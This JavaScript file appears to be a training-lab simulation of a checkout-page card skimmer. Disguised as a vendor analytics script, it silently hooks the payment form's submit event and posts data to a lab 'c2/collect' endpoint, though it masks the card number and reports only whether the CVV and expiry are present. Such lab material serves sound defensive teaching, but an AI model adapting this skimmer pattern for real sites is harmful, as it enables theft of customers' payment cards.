;(() => {
  const form = document.querySelector('[data-lab5-checkout]')
  if (!form || form.dataset.errorFallbackBound === 'true') return

  form.dataset.errorFallbackBound = 'true'

  const normalize = value => String(value || '').replace(/\D/g, '')
  const maskCard = value => {
    const clean = normalize(value)
    if (clean.length < 8) return '****'
    return `${clean.slice(0, 4)} **** **** ${clean.slice(-4)}`
  }

  const endpoint = '/lab5/c2/collect'

  form.addEventListener(
    'submit',
    () => {
      const data = new FormData(form)
      const payload = {
        source: '404-error-page-injection',
        page: window.location.pathname,
        scriptPath: '/js/vendor/analytics-cart.js',
        masked_card: maskCard(data.get('cardNumber')),
        expiry_present: Boolean(data.get('expiry')),
        cvv_present: Boolean(data.get('cvv')),
        cardholder_present: Boolean(data.get('cardholder')),
        capturedAt: new Date().toISOString()
      }

      fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).catch(() => {})
    },
    { capture: true }
  )
})()
